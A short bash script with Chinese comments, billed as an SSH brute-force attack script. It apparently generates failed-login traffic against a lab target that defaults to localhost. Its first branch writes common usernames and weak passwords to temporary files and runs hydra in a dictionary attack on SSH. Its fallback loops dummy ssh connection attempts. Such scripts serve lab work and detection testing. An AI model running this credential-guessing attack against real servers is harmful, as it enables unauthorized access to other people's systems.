#!/bin/bash
# SSH 暴力破解攻击脚本
# 用法: TARGET=127.0.0.1 ./ssh_bruteforce.sh
# 注意: 靶机上需要运行 sshd (sudo systemctl start sshd)
#       如果不想装 hydra, 用纯 shell 循环 ssh 替代

TARGET="${TARGET:-127.0.0.1}"
ATTEMPTS="${ATTEMPTS:-15}"

echo "[SSH暴力破解] 开始攻击 $TARGET (${ATTEMPTS} 次尝试) ..."
sleep 1

# 方案 A: 用 hydra (需要安装)
if command -v hydra &> /dev/null; then
    echo "  使用 hydra 进行字典攻击..."
    # 生成临时用户/密码列表
    cat > /tmp/users.txt << EOF
root
admin
user
test
oracle
EOF
    cat > /tmp/passwords.txt << EOF
password
123456
admin
root
toor
qwerty
letmein
pass123
admin123
test123
EOF
    hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 4 -w 1 -f "$TARGET" ssh 2>&1 | head -5
    rm -f /tmp/users.txt /tmp/passwords.txt
else
    # 方案 B: 纯 shell 循环模拟连接尝试
    echo "  使用纯 shell 模拟 SSH 连接尝试..."
    for i in $(seq 1 "$ATTEMPTS"); do
        ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=1 \
            -o PasswordAuthentication=no \
            "nonexistent${i}@$TARGET" 2>&1 | head -1
        sleep 0.5
    done
fi

echo "[SSH暴力破解] 完成"
